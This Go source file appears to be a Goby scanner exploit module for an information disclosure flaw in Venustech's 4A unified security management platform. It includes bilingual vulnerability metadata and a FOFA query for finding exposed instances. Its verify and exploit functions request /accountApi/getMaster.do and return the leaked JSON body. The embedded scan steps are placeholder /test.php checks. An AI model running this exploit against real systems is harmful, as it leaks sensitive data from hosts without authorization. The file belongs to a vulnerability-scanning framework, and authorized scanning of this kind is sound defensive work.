package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Venustech 4A unified security management platform accountApi/getMaster.do file information disclosure vulnerability",
    "Description": "<p>4A unified security management and control platform (hereinafter referred to as 4A enterprise version), realizes centralized management of IT resources (including system resources and business resources), and provides enterprises with centralized accounts (Account), authentication (Authentication), authorization (Authorization), audit (Audit) ) Management technical support and supporting processes to improve system security and manageability.</p><p>The attacker reads sensitive system information by constructing a special URL address.</p>",
    "Product": "4A-Unified-Sec-Control-Platform",
    "Homepage": "https://www.venustech.com.cn/new_type/4Aglpt/",
    "DisclosureDate": "2023-08-13",
    "PostTime": "2023-08-13",
    "Author": "1691834629@qq.com",
    "FofaQuery": "title=\"4A统一安全管控平台\"",
    "GobyQuery": "title=\"4A统一安全管控平台\"",
    "Level": "1",
    "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.venusgroup.com.cn/new_type/4Aglpt/\">https://www.venusgroup.com.cn/new_type/4Aglpt/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "启明星辰 4A 统一安全管控平台 accountApi/getMaster.do 文件信息泄露漏洞",
            "Product": "启明星辰-4A统一安全管控平台",
            "Description": "<p>4A统一安全管控平台（以下简称4A企业版），实现IT资源（包括系统资源和业务资源）集中管理，为企业提供集中的账号（Account） 、认证（Authentication）、授权(Authorization) 、审计(Audit)管理技术支撑及配套流程，提升系统安全性和可管理能力。<br></p><p>攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.venusgroup.com.cn/new_type/4Aglpt/\" target=\"_blank\">https://www.venusgroup.com.cn/new_type/4Aglpt/</a><br></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Venustech 4A unified security management platform accountApi/getMaster.do file information disclosure vulnerability",
            "Product": "4A-Unified-Sec-Control-Platform",
            "Description": "<p>4A unified security management and control platform (hereinafter referred to as 4A enterprise version), realizes centralized management of IT resources (including system resources and business resources), and provides enterprises with centralized accounts (Account), authentication (Authentication), authorization (Authorization), audit (Audit) ) Management technical support and supporting processes to improve system security and manageability.</p><p>The attacker reads sensitive system information by constructing a special URL address.</p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"https://www.venusgroup.com.cn/new_type/4Aglpt/\" target=\"_blank\">https://www.venusgroup.com.cn/new_type/4Aglpt/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10825"
}`
	sendPayloadIaoskdawqm := func(hostInfo *httpclient.FixUrl, url, param string) (*httpclient.HttpResponse, error) {
		cfg := httpclient.NewGetRequestConfig(url)
		if param != "" {
			cfg = httpclient.NewPostRequestConfig(url)
			cfg.Data = param
		}
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		return resp, err
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, err := sendPayloadIaoskdawqm(hostInfo, "/accountApi/getMaster.do", "")
			if err != nil {
				return false
			}
			return resp.StatusCode == 200 && strings.HasPrefix(resp.Utf8Html, `{`) && strings.HasSuffix(resp.Utf8Html, `}`) && strings.Contains(resp.Utf8Html, `master`)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			resp, err := sendPayloadIaoskdawqm(expResult.HostInfo, "/accountApi/getMaster.do", "")
			if err != nil {
				expResult.Success = false
				return expResult
			}
			if resp.StatusCode == 200 && strings.HasPrefix(resp.Utf8Html, `{`) && strings.HasSuffix(resp.Utf8Html, `}`) && strings.Contains(resp.Utf8Html, `master`) {
				expResult.Success = true
				expResult.Output = resp.Utf8Html
			}
			return expResult
		},
	))
}
